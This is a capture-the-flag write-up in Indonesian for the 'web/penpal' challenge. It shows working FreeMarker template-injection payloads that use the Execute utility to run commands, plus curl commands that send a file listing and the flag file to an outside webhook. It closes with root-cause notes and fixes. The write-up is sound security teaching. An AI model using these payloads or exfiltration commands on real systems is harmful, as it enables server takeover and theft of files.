# Writeup - web/penpal

## Ringkasan
Challenge ini punya fitur kirim email dengan body bertag **FreeMarker**.
Backend mengeksekusi template user input tanpa sandbox yang ketat, sehingga bisa kena **Server-Side Template Injection (SSTI)** dan lanjut ke **Remote Command Execution (RCE)** via utility `freemarker.template.utility.Execute`.

Flag yang didapat:

`squ1rrel{m4k1ng_fr13nds_t4k3s_t1m3}`

## Informasi challenge
- Kategori: web misc
- Judul: `web/penpal`
- Target: `https://penpal.squ1rrel.dev`

## 1. Enumerasi awal
Buka halaman utama dan cek JavaScript client-side.

Ditemukan request utama:
- `POST /send`
- body JSON:
  - `subject`
  - `body`

UI juga memberi hint bahwa body diproses dengan FreeMarker (tag `FreeMarker`).

## 2. Uji SSTI FreeMarker
Kirim payload ke `/send`:

```json
{
  "subject": "x",
  "body": "${\"freemarker.template.utility.Execute\"?new()(\"sleep 4\")}"
}
```

Respons API tetap generik (`{"message":"Email queued for delivery."}`), tapi waktu respons jadi jauh lebih lama.

Kesimpulan:
- ekspresi FreeMarker user memang dievaluasi di server,
- object `Execute` masih bisa dipanggil,
- terjadi blind RCE (output command tidak dipantulkan ke response).

## 3. Bangun kanal exfil data
Karena output command blind, saya pakai callback keluar dari server challenge ke webhook pribadi (Webhook.site).

Contoh payload command:

```text
curl -sS https://webhook.site/<TOKEN>?ping=hello
```

Payload FreeMarker:

```text
${"freemarker.template.utility.Execute"?new()("curl -sS https://webhook.site/<TOKEN>?ping=hello")}
```

Request callback masuk dari host challenge, artinya outbound network dari server bisa dipakai buat exfil.

## 4. Cari lokasi flag
Saya jalankan command untuk cari path yang mengandung `flag`:

```text
find / -maxdepth 6 -iname *flag* -fprint /tmp/found.txt
```

Lalu upload hasil file itu ke webhook:

```text
curl -sS -X POST https://webhook.site/<TOKEN>?src=foundtxt --data-binary @/tmp/found.txt
```

Dari hasil `found.txt`, ada path penting:

`/etc/ctf/flag.txt`

## 5. Exfil flag final
Upload langsung isi file flag:

```text
curl -sS -X POST https://webhook.site/<TOKEN>?src=realflag --data-binary @/etc/ctf/flag.txt
```

Isi yang diterima webhook:

`squ1rrel{m4k1ng_fr13nds_t4k3s_t1m3}`

## Akar masalah
- User input template diproses langsung oleh FreeMarker.
- Built-in/utility berbahaya (`Execute`) tidak diblok.
- Tidak ada sandbox template yang membatasi class/object sensitif.

## Dampak
- RCE di server aplikasi
- Baca file sensitif (termasuk flag)
- Potensi lateral movement jika environment produksi nyata

## Solver
Solver otomatis sudah disimpan di file:

- `solve.py`

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
cd /home/nata/ctf/squ1rrel/web/penpal
python solve.py --token <WEBHOOK_SITE_TOKEN>
```

Output akhir akan berformat:

```text
<FLAG>...</FLAG>
```

## Catatan perbaikan (defense)
- Jangan render template dari user sebagai trusted template.
- Jika memang butuh templating, gunakan whitelist variabel sederhana tanpa evaluasi ekspresi bebas.
- Aktifkan sandbox ketat FreeMarker, blok object construction dan class utility berbahaya.
- Pisahkan worker pengolah template ke environment terisolasi minimum privilege.
